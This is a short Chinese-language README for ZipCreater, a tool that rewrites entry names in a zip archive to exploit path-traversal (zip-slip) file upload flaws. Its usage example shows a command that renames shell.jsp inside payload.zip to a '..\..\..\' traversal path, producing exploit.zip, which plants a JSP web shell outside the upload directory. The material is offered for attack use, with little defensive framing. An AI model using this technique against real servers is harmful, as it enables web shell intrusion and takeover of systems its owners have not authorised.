## ZipCreater

ZipCreater主要应用于跨目录的文件上传漏洞的利用，它能够快速进行压缩包生成，[evilarc.py](https://github.com/ptoomey3/evilarc/blob/master/evilarc.py)不支持修改已有的压缩包，但ZipCreater可以。

使用方式：

假设payload.zip文件压缩内容如下：

```
1.txt
2.txt
shell.jsp
```

使用ZipCreater可以将shell.jsp的压缩文件名进行更改：

```
$ zipcreater -dest /tmp/exploit.zip -source /tmp/payload.zip -path '..\..\..\..\..\..\webshell.jsp'
```

exploit.zip内容如下：

```
1.txt
2.txt
..\..\..\..\..\..\webshell.jsp
```


注：ZipCreater只能修改shell.jsp，你可以根据它来修改成自己想要的程序。


